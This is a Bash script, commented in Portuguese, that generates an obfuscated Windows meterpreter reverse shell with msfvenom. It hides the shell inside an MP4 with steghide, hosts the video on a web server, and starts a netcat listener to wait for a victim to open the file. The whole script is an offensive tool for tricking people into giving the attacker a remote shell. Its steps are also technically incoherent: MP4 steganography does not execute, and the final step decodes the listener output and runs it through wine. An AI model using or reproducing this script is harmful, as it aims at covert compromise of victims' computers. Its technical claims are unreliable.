#!/bin/bash

# Solicitar ao usuário o endereço IP
echo "Insira o endereço IP do servidor:"
read LHOST

# Solicitar ao usuário a porta
echo "Insira a porta do servidor:"
read LPORT

# Solicitar ao usuário o caminho do arquivo MP4
echo "Insira o caminho completo do arquivo MP4:"
read FILENAME

# Gerar um shell reverso ofuscado com o msfvenom
echo "Gerando o shell reverso ofuscado..."
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -e x86/shikata_ga_nai -i 5 -f raw | base64 | tr -d '\n' > encoded.txt

# Incorporar o código executável do shell reverso no arquivo MP4
echo "Incorporando o shell reverso no arquivo MP4..."
steghide embed -cf $FILENAME -ef encoded.txt -p senha123

# Salvar o arquivo MP4 modificado em uma pasta específica
echo "Salvando o arquivo MP4 modificado..."
mkdir -p /var/www/html/videos
mv $FILENAME /var/www/html/videos

# Iniciar um servidor netcat para escutar a porta especificada
echo "Iniciando o servidor netcat..."
nc -nlvp $LPORT > output.txt &

# Exibir mensagem aguardando a vítima abrir o arquivo MP4
echo "Aguardando a vítima abrir o arquivo $FILENAME..."

# Esperar a vítima abrir o arquivo MP4. Quando a vítima abre o arquivo MP4, o shell reverso é executado e se conecta ao servidor netcat que você configurou.
while true
do
    sleep 5
    if [ -e output.txt ]; then
        echo "Conexão reversa estabelecida!"
        break
    fi
done

# Decodificar o shell reverso ofuscado
echo "Decodificando o shell reverso..."
cat output.txt | base64 -d > decoded.exe

# Executar o shell reverso decodificado
echo "Executando o shell reverso..."
wine /usr/share/windows-binaries/powershell.exe -exec bypass -NonInteractive -EncodedCommand $(cat decoded.exe | base64 -w 0)
